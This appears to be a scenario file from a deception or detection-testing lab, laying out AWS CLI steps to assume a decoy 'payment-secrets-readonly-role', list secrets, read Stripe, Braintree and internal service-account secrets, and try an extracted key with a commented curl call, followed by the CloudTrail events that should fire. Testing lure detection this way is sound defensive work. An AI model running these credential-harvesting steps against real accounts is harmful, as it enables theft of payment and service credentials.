# Scenario 2 — Abuse Steps: Secrets Manager Payment Credentials Lure

## Prerequisites
- AWS CLI configured with any IAM identity in the target account
- Account ID known

## Step-by-Step

```bash
# 1. Discover and assume the lure role
ACCOUNT_ID=$(aws sts get-caller-identity --query "Account" --output text)

CREDS=$(aws sts assume-role \
  --role-arn "arn:aws:iam::${ACCOUNT_ID}:role/payment-secrets-readonly-role" \
  --role-session-name "recon-session" \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r .SessionToken)

# 2. List all secrets — find payment-related ones
aws secretsmanager list-secrets --query "SecretList[*].[Name,Description]" --output table

# 3. Read Stripe keys
aws secretsmanager get-secret-value \
  --secret-id "prod/payment-gateway/stripe-keys" \
  --query "SecretString" --output text | jq .

# 4. Read Braintree credentials
aws secretsmanager get-secret-value \
  --secret-id "prod/payment-gateway/braintree-credentials" \
  --query "SecretString" --output text | jq .

# 5. Read internal service account credentials
aws secretsmanager get-secret-value \
  --secret-id "prod/internal-api/service-accounts" \
  --query "SecretString" --output text | jq .

# 6. Attempt to use extracted credentials (triggers detection)
# Example: test Stripe key
# curl https://api.stripe.com/v1/charges -u "sk_live_51HzGr4eC39HqLyjWDarjtT1zdp7dc:"

# 7. Clean up session
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
```

## Detection Signals
- CloudTrail: `AssumeRole` on `payment-secrets-readonly-role`
- CloudTrail: `ListSecrets`
- CloudTrail: `GetSecretValue` on each secret (3 events)
- Any attempted use of extracted payment credentials
